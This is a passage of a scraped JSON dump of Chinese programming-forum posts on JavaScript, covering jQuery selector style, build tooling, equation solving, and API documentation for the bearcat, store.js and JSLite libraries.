"\r", " \r", "$('[data-trigger=\"delete\"]')\r", "这个不丑吧，除去data这个词，trigger和delete用最简单的方法描述了这个函数的类型和作用。\r", "\r", " \r", "selectQuery是DOM API？那选出来的元素，如果再进行其他jQuery操作的话，不是还得转化过去。。。\r", "\r", " \r", "nice code。只用一个名为action的class name就解决了效率的问题。\r", "\r", " \r", "期待你的研究成果。", " @", " \r", "\r", "怎么可能会丑……直接扩展 jQuery 的选择器语法不就好了？甚至包装一下 $ 函数，比如如果选择器以 & 开头，就替换为属性选择器：\r", "\r", "$('&delete') -> $('[data-trigger=\"delete\"]')\r", "\r", "这样子难道还丑么？", "我始终秉持一个观点，在绝大部分开发工作中，可维护性远比效率重要太多了，完全可以牺牲效率还提升可维护性"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>想实现这样的功能，<br>\n<code><br>\n(function($, d, w) {<br>\n   var container = {<br>\n      ....<br>\n   };<br>\n})(jQuery, document, window);<br>\n</code></p>\n\n<p>其中container内的行数非常多，包含各种各样的属性和方法。<br>\n并且有非常多类似container的对象</p>\n\n<p>这个js文件经常超过1000行， 开发起来非常难过，老是要上下滚动找来找去。如果变成这样：<br>\n<code><br>\n(function($, d, w) {<br>\n   $.include(file1)<br>\n   $.include(file2)<br>\n   ...<br>\n})(jQuery, document, window);<br>\n</code><br>\n就会更加方便。每次修改后重新合并一下， 类似css的预处理器sass</p>\n\n<p>请问有这样的工具吗？</p>\n\n<p>先感谢了。</p>\n</div></div>"], "reply": "1", "tittle": "求问是否存在类似 sass 的 js 预处理器", "comment": ["额  找到了gulp  没事了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img src=\"http://i.imgur.com/0ABzGKC.png\" alt=\"wolfram\"></p>\n\n<p>上图是我要在js中解出来的二元方程，在Wolfram中可以看出来是有两个solution的，但是在js中总是返回第一组解，有什么办法可以取到第二组解呢？</p>\n\n<p>更准确的是，如何通过条件判断获得特定的解呢？<br>\n比如说如果该组解的x处于[500,1000]范围内，则取该组解。</p>\n</div></div>"], "reply": "3", "tittle": "Javascript 中，二元多次方程可能有多个解时，如何选取自己想要的那个解？", "comment": ["你会手解二元二次方程吗?\r", "\r", "会的话把解析式用js写一遍\r", "不会就找会的人帮你写 给他钱", " 这个我在js里面肯定是写成了：\r", "x = ...\r", "y = ...\r", "\r", "就是说，这样得出来的x, y总是第一组解，而不是我想要的那组解", "你需要的是线性代数，矩阵求解方程方面的资料。一般科学软件解方程都是用这种方法。\r", "\r"]},
{"content": ["<div class=\"topic_content\">bearcat 0.3 版本在圣诞正式推出  <br>bearcat 不再仅仅支持node.js环境，浏览器环境也完美支持  <br>意味着 前端也可以编写基于自描述js对象的依赖注入  <br>依赖关系基于js对象属性的自描述，无需使用require, define来进行模块管理  <br>同时bearcat还内建了script脚本异步加载机制，无需打包，前端模块化开发所见即所得  <br>10秒例子，car 依赖 engine，解析到car依赖后，engine就自动加载并注入到car中<br>```<br>var Car = function() {<br>    this.$id = \"car\";<br>    this.$engine = null;<br>}<br><br>Car.prototype.run = function() { <br>    this.$engine.run(); <br>    console.log('run car...');<br>}<br><br>bearcat.module(Car, typeof module !== 'undefined' ? module : {});<br>```<br><br>```<br>var Engine = function() {<br>    this.$id = \"engine\";<br>}<br><br>Engine.prototype.run = function() {<br>    console.log('run engine...');<br>}<br><br>bearcat.module(Engine, typeof module !== 'undefined' ? module : {});<br>```<br><br>详情还请到官网 <a target=\"_blank\" href=\"http://bearcatjs.org/\" rel=\"nofollow\">http://bearcatjs.org/</a>  <br>sweet例子 <a target=\"_blank\" href=\"http://bearcatjs.org/examples/\" rel=\"nofollow\">http://bearcatjs.org/examples/</a></div>"], "reply": "目前尚无回", "tittle": "bearcat 0.3 版本正式发布 - 让前端也流畅使用依赖注入", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/jaywcjlove/store.js\">Github</a> | <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/jaywcjlove/store.js/archive/master.zip\">点击下载</a></p>\n\n<h2>本地存储APIs</h2>\n<div class=\"highlight\"><pre><span class=\"nx\">store</span><span class=\"p\">(</span><span class=\"nx\">key</span><span class=\"p\">,</span> <span class=\"nx\">data</span><span class=\"p\">);</span>                 <span class=\"c1\">//单个存储字符串数据</span>\n<span class=\"nx\">store</span><span class=\"p\">({</span><span class=\"nx\">key</span><span class=\"o\">:</span> <span class=\"nx\">data</span><span class=\"p\">,</span> <span class=\"nx\">key2</span><span class=\"o\">:</span> <span class=\"nx\">data2</span><span class=\"p\">});</span>  <span class=\"c1\">//批量存储多个字符串数据</span>\n<span class=\"nx\">store</span><span class=\"p\">(</span><span class=\"nx\">key</span><span class=\"p\">);</span>                       <span class=\"c1\">//获取key的字符串数据</span>\n<span class=\"nx\">store</span><span class=\"p\">();</span>                          <span class=\"c1\">//获取所有key/data</span>\n<span class=\"nx\">store</span><span class=\"p\">(</span><span class=\"kc\">false</span><span class=\"p\">);</span>                     <span class=\"c1\">//清空所有key/data</span>\n\n<span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">set</span><span class=\"p\">(</span><span class=\"nx\">key</span><span class=\"p\">,</span> <span class=\"nx\">data</span><span class=\"p\">[,</span> <span class=\"nx\">overwrite</span><span class=\"p\">]);</span><span class=\"c1\">//=== store(key, data);</span>\n<span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">setAll</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">[,</span> <span class=\"nx\">overwrite</span><span class=\"p\">]);</span>  <span class=\"c1\">//=== store({key: data, key2: data});</span>\n<span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">get</span><span class=\"p\">(</span><span class=\"nx\">key</span><span class=\"p\">[,</span> <span class=\"nx\">alt</span><span class=\"p\">]);</span>            <span class=\"c1\">//=== store(key);</span>\n<span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">getAll</span><span class=\"p\">();</span>                   <span class=\"c1\">//=== store();</span>\n<span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">clear</span><span class=\"p\">();</span>                    <span class=\"c1\">//=== store(false);</span>\n<span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">keys</span><span class=\"p\">();</span>                     <span class=\"c1\">//返回所有key的数组</span>\n<span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">forEach</span><span class=\"p\">(</span><span class=\"nx\">callback</span><span class=\"p\">);</span>          <span class=\"c1\">//循环遍历，返回false结束遍历</span>\n\n<span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">has</span><span class=\"p\">(</span><span class=\"nx\">key</span><span class=\"p\">);</span>         <span class=\"c1\">//⇒判断是否存在返回true/false          </span>\n<span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">remove</span><span class=\"p\">(</span><span class=\"nx\">key</span><span class=\"p\">);</span>      <span class=\"c1\">//⇒删除key包括key的字符串数据</span>\n</pre></div>\n\n<h3>set</h3>\n\n<p>单个存储或删除字符串数据&lt;br/&gt;<br>\n<code>store.set(key, data[, overwrite]);</code>&lt;br/&gt;<br>\n效果相同<code>store(key, data);</code>&lt;br/&gt;</p>\n<div class=\"highlight\"><pre><span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">set</span><span class=\"p\">(</span><span class=\"s2\">\"wcj\"</span><span class=\"p\">,</span><span class=\"s2\">\"1\"</span><span class=\"p\">)</span>   <span class=\"c1\">//⇒  1</span>\n<span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">set</span><span class=\"p\">(</span><span class=\"s2\">\"wcj\"</span><span class=\"p\">)</span>       <span class=\"c1\">//⇒  删除wcj及字符串数据</span>\n</pre></div>\n\n<h3>setAll</h3>\n\n<p>批量存储多个字符串数据&lt;br/&gt;<br>\n<code>store.setAll(data[, overwrite])</code>&lt;br/&gt;<br>\n效果相同<code>store({key: data, key2: data});</code>&lt;br/&gt;</p>\n<div class=\"highlight\"><pre><span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">setAll</span><span class=\"p\">({</span>\n    <span class=\"s2\">\"wcj1\"</span><span class=\"o\">:</span><span class=\"mi\">123</span><span class=\"p\">,</span>\n    <span class=\"s2\">\"wcj2\"</span><span class=\"o\">:</span><span class=\"mi\">345</span>\n<span class=\"p\">})</span> <span class=\"c1\">//存储两条字符串数据</span>\n\n<span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">setAll</span><span class=\"p\">([</span><span class=\"s2\">\"w1\"</span><span class=\"p\">,</span><span class=\"s2\">\"w2\"</span><span class=\"p\">,</span><span class=\"s2\">\"w3\"</span><span class=\"p\">])</span> \n<span class=\"c1\">//存储三条字符串数据 </span>\n<span class=\"c1\">//  0⇒ \"w1\"</span>\n<span class=\"c1\">//  1⇒ \"w2\"</span>\n<span class=\"c1\">//  2⇒ \"w3\"</span>\n</pre></div>\n\n<h3>get</h3>\n\n<p>获取key的字符串数据&lt;br/&gt;<br>\n<code>store.get(key[, alt])</code>&lt;br/&gt;<br>\n效果相同<code>store(key)</code>&lt;br/&gt;</p>\n<div class=\"highlight\"><pre><span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">get</span><span class=\"p\">(</span><span class=\"s2\">\"wcj1\"</span><span class=\"p\">)</span> <span class=\"c1\">//获取wcj1的字符串数据</span>\n<span class=\"nx\">store</span><span class=\"p\">(</span><span class=\"s2\">\"wcj1\"</span><span class=\"p\">)</span> <span class=\"c1\">//功能同上</span>\n</pre></div>\n\n<h3>getAll</h3>\n\n<p>获取所有key/data&lt;br/&gt;<br>\n<code>store.getAll()</code>&lt;br/&gt;<br>\n效果相同<code>store()</code>&lt;br/&gt;</p>\n<div class=\"highlight\"><pre><span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">getAll</span><span class=\"p\">()</span> <span class=\"c1\">//⇒JSON</span>\n<span class=\"nx\">store</span><span class=\"p\">()</span> <span class=\"c1\">//功能同上</span>\n</pre></div>\n\n<h3>clear</h3>\n\n<p>清空所有key/data&lt;br/&gt;<br>\n<code>store.clear()</code>&lt;br/&gt;<br>\n效果相同<code>store(false)</code>&lt;br/&gt;</p>\n<div class=\"highlight\"><pre><span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">clear</span><span class=\"p\">()</span> <span class=\"c1\">//</span>\n<span class=\"nx\">store</span><span class=\"p\">(</span><span class=\"kc\">false</span><span class=\"p\">)</span>  <span class=\"c1\">//功能同上</span>\n</pre></div>\n\n<h3>keys</h3>\n\n<p>返回所有key的数组&lt;br/&gt;<br>\n<code>store.clear()</code>&lt;br/&gt;</p>\n<div class=\"highlight\"><pre><span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">keys</span><span class=\"p\">()</span> <span class=\"c1\">//⇒[\"w1\", \"w2\", \"w3\"]</span>\n</pre></div>\n\n<h3>has</h3>\n\n<p>判断是否存在返回true/false&lt;br/&gt;<br>\n<code>store.has(key)</code>&lt;br/&gt;</p>\n<div class=\"highlight\"><pre><span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">has</span><span class=\"p\">(</span><span class=\"s2\">\"w1\"</span><span class=\"p\">);</span> <span class=\"c1\">//⇒true</span>\n</pre></div>\n\n<h3>remove</h3>\n\n<p>删除key包括key的字符串数据&lt;br/&gt;<br>\n<code>store.remove(key)</code>&lt;br/&gt; </p>\n<div class=\"highlight\"><pre><span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">has</span><span class=\"p\">(</span><span class=\"s2\">\"w1\"</span><span class=\"p\">);</span> <span class=\"c1\">//删除w1</span>\n\n<span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">set</span><span class=\"p\">(</span><span class=\"s2\">\"w1\"</span><span class=\"p\">)</span> <span class=\"c1\">//这样也是 删除w1</span>\n</pre></div>\n\n<h3>forEach</h3>\n\n<p>循环遍历，返回false结束遍历</p>\n<div class=\"highlight\"><pre><span class=\"nx\">store</span><span class=\"p\">.</span><span class=\"nx\">forEach</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">k</span><span class=\"p\">,</span><span class=\"nx\">d</span><span class=\"p\">){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">k</span><span class=\"p\">,</span><span class=\"nx\">d</span><span class=\"p\">)</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">k</span><span class=\"o\">==</span> <span class=\"mi\">3</span><span class=\"p\">)</span> <span class=\"k\">return</span> <span class=\"kc\">false</span>\n<span class=\"p\">})</span>\n</pre></div>\n</div></div>"], "reply": "1", "tittle": "store.js 本地存储 localstorage 的封装，提供简单的 AIP", "comment": ["不错！收藏了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>JSLite</h1>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://blog.pc175.com/JSLite/\"> [官方网站] </a><br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://blog.pc175.com/JSLite/doc/\"> [官方文档-更详细] </a></p>\n\n<hr>\n\n<p>让web开发更迅速，下载执行更快、量级更轻，针对现代高级浏览器的JavaScript库。 推进前端开发标准对于攻城师来说，人人有责。</p>\n\n<h2>选择器$</h2>\n\n<p>选择器使用的是浏览器自带的方法封装的 <code>querySelectorAll</code> ，没有使用jQuery作者John Resig开发的DOM选择器引擎(Dom Selector Engine) <code>Sizzle</code> 。目前 IE8/9及Firefox/Chrome/Safari/Opera 的最新版已经支持 <code>querySelectorAll</code> 。</p>\n\n<p>$(selector)                 //⇒ 选择节点&lt;br&gt;<br>\n$(\"&lt;DOM nodes&gt;\")            //⇒ 生成节点&lt;br&gt;<br>\n$(\"htmlString\")             //⇒ 生成&lt;br&gt;<br>\nJSLite(function($){ ... })  //⇒ 相当于ready</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ 返回节点数组  //⇒ [&lt;div&gt;​…​&lt;/div&gt;​]</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"&lt;div&gt;&lt;/div&gt;\"</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ 生成div节点</span>\n<span class=\"c1\">//JSLite(func) 相当于ready</span>\n<span class=\"nx\">JSLite</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$</span><span class=\"p\">){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">\"在节点加载完成之后执行\"</span><span class=\"p\">)</span>\n<span class=\"p\">})</span>\n<span class=\"c1\">//$(func) 相当于ready</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">$</span><span class=\"p\">){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s2\">\"在节点加载完成之后执行\"</span><span class=\"p\">)</span>\n<span class=\"p\">})</span>\n</pre></div>\n\n<hr>\n\n<h2>插件编写</h2>\n\n<h3>$.extend</h3>\n\n<p>通过源对象扩展目标对象的属性，扩展 <code>JSLite</code> 元素集来提供新的方法（通常用来制作插件）</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span>\n    <span class=\"nx\">min</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">a</span><span class=\"p\">,</span> <span class=\"nx\">b</span><span class=\"p\">)</span> <span class=\"p\">{</span> <span class=\"k\">return</span> <span class=\"nx\">a</span> <span class=\"o\">&lt;</span> <span class=\"nx\">b</span> <span class=\"o\">?</span> <span class=\"nx\">a</span> <span class=\"o\">:</span> <span class=\"nx\">b</span><span class=\"p\">;</span> <span class=\"p\">},</span>\n    <span class=\"nx\">max</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">a</span><span class=\"p\">,</span> <span class=\"nx\">b</span><span class=\"p\">)</span> <span class=\"p\">{</span> <span class=\"k\">return</span> <span class=\"nx\">a</span> <span class=\"o\">&gt;</span> <span class=\"nx\">b</span> <span class=\"o\">?</span> <span class=\"nx\">a</span> <span class=\"o\">:</span> <span class=\"nx\">b</span><span class=\"p\">;</span> <span class=\"p\">}</span>\n<span class=\"p\">});</span>\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">min</span><span class=\"p\">(</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">);</span>    <span class=\"c1\">//⇒ 2</span>\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">max</span><span class=\"p\">(</span><span class=\"mi\">4</span><span class=\"p\">,</span><span class=\"mi\">5</span><span class=\"p\">);</span>    <span class=\"c1\">//⇒ 5</span>\n<span class=\"c1\">// 在$上扩展了几个方法  </span>\n<span class=\"c1\">//调用方法  $.min(2,3);   //⇒ 2</span>\n<span class=\"c1\">//调用方法  $.max(4,5);   //⇒ 5</span>\n</pre></div>\n\n<h3>$.fn.extend</h3>\n\n<p>扩展 <code>JSLite</code> 元素集来提供新的方法（通常用来制作插件）。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">fn</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span>   <span class=\"c1\">//增加两个插件方法。</span>\n    <span class=\"nx\">check</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n        <span class=\"k\">return</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">each</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">checked</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"p\">;</span> <span class=\"p\">});</span>\n    <span class=\"p\">},</span>\n    <span class=\"nx\">uncheck</span><span class=\"o\">:</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n        <span class=\"k\">return</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">each</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">checked</span> <span class=\"o\">=</span> <span class=\"kc\">false</span><span class=\"p\">;</span> <span class=\"p\">});</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">});</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"input[type=checkbox]\"</span><span class=\"p\">).</span><span class=\"nx\">check</span><span class=\"p\">();</span>  <span class=\"c1\">//选中</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"input[type=radio]\"</span><span class=\"p\">).</span><span class=\"nx\">uncheck</span><span class=\"p\">();</span>   <span class=\"c1\">//取消选中</span>\n</pre></div>\n\n<h3>$.error</h3>\n\n<p>当元素遇到错误（没有正确载入）时，发生 <code>error</code> 事件。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">error</span><span class=\"p\">(</span><span class=\"s2\">\"2222\"</span><span class=\"p\">)</span>\n<span class=\"c1\">//⇒ 输出错误 Uncaught 2222</span>\n</pre></div>\n\n<hr>\n\n<h2>URL</h2>\n\n<h3>$.getUrlParam</h3>\n\n<p>获取 <code>url</code> 参数的值。</p>\n<div class=\"highlight\"><pre><span class=\"c1\">//[URL] = http://blog.pc175.com/?param=2</span>\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">getUrlParam</span><span class=\"p\">(</span><span class=\"s2\">\"param\"</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ 2</span>\n</pre></div>\n\n<h3>$.param</h3>\n\n<p>将表单元素数组或者对象序列化。如果shallow设置为true，嵌套对象不会被序列化，嵌套数组的值不会使用放括号在他们的key上。&lt;br&gt;<br>\n$.param(object, [shallow])   ⇒ string &lt;br&gt;<br>\n$.param(array)   ⇒ string</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">param</span><span class=\"p\">({</span>\n    <span class=\"nx\">foo</span><span class=\"o\">:</span> <span class=\"p\">{</span><span class=\"nx\">one</span><span class=\"o\">:</span> <span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"nx\">two</span><span class=\"o\">:</span> <span class=\"mi\">2</span> <span class=\"p\">}</span>\n<span class=\"p\">})</span>  <span class=\"c1\">//⇒ \"foo[one]=1&amp;foo[two]=2\"</span>\n\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">param</span><span class=\"p\">({</span>\n    <span class=\"nx\">ids</span><span class=\"o\">:</span><span class=\"p\">[</span><span class=\"s2\">\"a1\"</span><span class=\"p\">,</span><span class=\"s2\">\"b2\"</span><span class=\"p\">,</span><span class=\"s2\">\"c3\"</span><span class=\"p\">],</span>\n    <span class=\"nx\">c</span><span class=\"o\">:</span><span class=\"p\">{</span><span class=\"nx\">g</span><span class=\"o\">:</span><span class=\"mi\">23</span><span class=\"p\">,</span><span class=\"nx\">e</span><span class=\"o\">:</span><span class=\"p\">[</span><span class=\"mi\">567</span><span class=\"p\">]},</span>\n    <span class=\"nx\">a</span><span class=\"o\">:</span><span class=\"mi\">3</span>\n<span class=\"p\">},</span><span class=\"kc\">true</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ ids=a1&amp;&amp;ids=b2&amp;&amp;ids=c3&amp;&amp;c=[object Object]&amp;a=3</span>\n\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">param</span><span class=\"p\">({</span>\n    <span class=\"nx\">ids</span><span class=\"o\">:</span><span class=\"p\">[</span><span class=\"s2\">\"a1\"</span><span class=\"p\">,</span><span class=\"s2\">\"b2\"</span><span class=\"p\">,</span><span class=\"s2\">\"c3\"</span><span class=\"p\">],</span>\n    <span class=\"nx\">c</span><span class=\"o\">:</span><span class=\"p\">{</span><span class=\"nx\">g</span><span class=\"o\">:</span><span class=\"mi\">23</span><span class=\"p\">,</span><span class=\"nx\">e</span><span class=\"o\">:</span><span class=\"p\">[</span><span class=\"mi\">567</span><span class=\"p\">]},</span>\n    <span class=\"nx\">a</span><span class=\"o\">:</span><span class=\"mi\">3</span>\n<span class=\"p\">})</span> <span class=\"c1\">//⇒ ids[]=a1&amp;&amp;ids[]=b2&amp;&amp;ids[]=c3&amp;&amp;c[g]=23&amp;&amp;c[e]=567&amp;&amp;a=3</span>\n\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">param</span><span class=\"p\">([</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">])</span> <span class=\"c1\">//⇒ 0=1&amp;&amp;1=2&amp;&amp;2=3</span>\n\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">param</span><span class=\"p\">({</span>\n    <span class=\"nx\">ids</span><span class=\"o\">:</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">]</span> \n<span class=\"p\">})</span>  <span class=\"c1\">//=&gt; \"ids[]=1&amp;ids[]=2&amp;ids[]=3\"</span>\n</pre></div>\n\n<hr>\n\n<h2>数组对象操作</h2>\n\n<h3>$.intersect</h3>\n\n<p>数组交集</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">intersect</span><span class=\"p\">([</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">,</span><span class=\"s1\">'asdkjf'</span><span class=\"p\">],[</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">,</span><span class=\"mi\">6</span><span class=\"p\">,</span><span class=\"s1\">'asdkjf'</span><span class=\"p\">])</span>\n<span class=\"c1\">//⇒ [2, 3, \"asdkjf\"]</span>\n</pre></div>\n\n<h3>$.sibling</h3>\n\n<p>根据类型获取节点对象属性的集合 <code>(node,type)</code>。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">sibling</span><span class=\"p\">(</span><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"input\"</span><span class=\"p\">),</span><span class=\"s2\">\"type\"</span><span class=\"p\">)</span>    <span class=\"c1\">//⇒ [\"text\", \"button\", \"checkbox\"]   </span>\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">sibling</span><span class=\"p\">(</span><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"input\"</span><span class=\"p\">),</span><span class=\"s2\">\"tagName\"</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ [\"INPUT\"]</span>\n</pre></div>\n\n<h3>$.inArray</h3>\n\n<p>搜索数组中指定值并返回它的索引（如果没有找到则返回<code>-1</code>)。</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">arr</span> <span class=\"o\">=</span> <span class=\"p\">[</span> <span class=\"mi\">4</span><span class=\"p\">,</span> <span class=\"s2\">\"Pete\"</span><span class=\"p\">,</span> <span class=\"mi\">8</span><span class=\"p\">,</span> <span class=\"s2\">\"John\"</span> <span class=\"p\">];</span>\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">inArray</span><span class=\"p\">(</span><span class=\"s2\">\"John\"</span><span class=\"p\">,</span> <span class=\"nx\">arr</span><span class=\"p\">);</span>     <span class=\"c1\">//⇒ 3</span>\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">inArray</span><span class=\"p\">(</span><span class=\"mi\">4</span><span class=\"p\">,</span> <span class=\"nx\">arr</span><span class=\"p\">);</span>          <span class=\"c1\">//⇒ 0</span>\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">inArray</span><span class=\"p\">(</span><span class=\"s2\">\"David\"</span><span class=\"p\">,</span> <span class=\"nx\">arr</span><span class=\"p\">);</span>    <span class=\"c1\">//⇒ -1</span>\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">inArray</span><span class=\"p\">(</span><span class=\"s2\">\"Pete\"</span><span class=\"p\">,</span> <span class=\"nx\">arr</span><span class=\"p\">,</span> <span class=\"mi\">2</span><span class=\"p\">);</span>  <span class=\"c1\">//⇒ -1</span>\n</pre></div>\n\n<h3>$.map</h3>\n\n<p>通过遍历集合中的节点对象，通过函数返回一个新的数组，<code>null</code> 或 <code>undefined</code> 将被过滤掉。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">map</span><span class=\"p\">({</span><span class=\"s2\">\"w\"</span><span class=\"o\">:</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"s2\">\"c\"</span><span class=\"o\">:</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"s2\">\"j\"</span><span class=\"o\">:</span><span class=\"mi\">3</span><span class=\"p\">},</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">item</span><span class=\"p\">,</span><span class=\"nx\">index</span><span class=\"p\">){</span>\n     <span class=\"k\">return</span> <span class=\"nx\">index</span>\n<span class=\"p\">});</span> \n<span class=\"c1\">//⇒ [\"w\", \"c\", \"j\"]</span>\n</pre></div>\n\n<h3>$.each</h3>\n\n<p>通用例遍方法，可用于例遍对象和数组</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">each</span><span class=\"p\">([</span><span class=\"s1\">'a'</span><span class=\"p\">,</span> <span class=\"s1\">'b'</span><span class=\"p\">,</span> <span class=\"s1\">'c'</span><span class=\"p\">],</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">index</span><span class=\"p\">,</span> <span class=\"nx\">item</span><span class=\"p\">){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'item %d is: %s'</span><span class=\"p\">,</span> <span class=\"nx\">index</span><span class=\"p\">,</span> <span class=\"nx\">item</span><span class=\"p\">)</span>\n<span class=\"p\">})</span>\n</pre></div>\n\n<hr>\n\n<h2>测试操作</h2>\n\n<h3>$.isDocument</h3>\n\n<p>判断对象是否为 [document] 。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">isDocument</span><span class=\"p\">(</span><span class=\"nb\">document</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ true</span>\n</pre></div>\n\n<h3>$.isFunction</h3>\n\n<p>判断对象是否为函数 [function] 。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">isFunction</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(){})</span> <span class=\"c1\">//⇒ true</span>\n</pre></div>\n\n<h3>$.isObject</h3>\n\n<p>判断是否为 <code>Object</code> 。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span 